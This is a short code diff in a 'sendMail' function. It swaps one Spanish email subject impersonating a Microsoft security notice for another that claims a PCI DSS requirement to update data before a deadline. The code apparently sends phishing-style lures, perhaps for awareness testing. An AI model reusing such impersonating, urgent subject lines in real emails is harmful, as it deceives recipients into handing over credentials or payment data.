@@ -51,7 +51,7 @@ async function sendMail(
       },
     });
 
-    const subjectMicrosoft = "Se necesita agregar información de seguridad a su cuenta de Microsoft";
+    const subjectMicrosoft = "Requerimiento PCI DSS: Actualiza tus Datos Antes del 19/05/2025";
 
     await sendEmail({
       to: user.email,
